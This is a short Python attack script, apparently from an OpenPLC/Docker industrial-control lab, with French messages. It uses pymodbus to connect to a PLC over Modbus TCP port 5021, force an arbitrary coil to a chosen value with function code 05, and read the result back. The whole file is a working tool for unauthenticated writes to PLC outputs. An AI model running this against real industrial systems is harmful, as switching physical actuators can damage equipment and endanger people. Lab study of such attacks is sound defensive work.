from pymodbus.client import ModbusTcpClient
import sys
import time

if len(sys.argv) != 4:
    print("Usage: python3 write_coil_attack_bridge.py <ip_openplc> <coil> <0|1>")
    print("Exemple: python3 write_coil_attack_bridge.py 172.23.0.3 9 1")
    exit(1)

HOST = sys.argv[1]
PORT = 5021
UNIT = 1

coil = int(sys.argv[2])
value = bool(int(sys.argv[3]))

client = ModbusTcpClient(HOST, port=PORT)

if not client.connect():
    print(f"Impossible de se connecter à {HOST}:{PORT}")
    exit(1)

print("=== ATTAQUE MODBUS FC05 SUR BRIDGE DOCKER ===")
print(f"Cible      : {HOST}:{PORT}")
print(f"Coil ciblé : {coil}")
print(f"Valeur     : {value}")

r = client.write_coil(coil, value, device_id=UNIT)

if r.isError():
    print("Erreur écriture coil")
else:
    print("Écriture réussie")

time.sleep(0.5)

rr = client.read_coils(coil, count=1, device_id=UNIT)
if not rr.isError():
    print(f"Lecture après écriture : coil {coil} = {bool(rr.bits[0])}")

client.close()
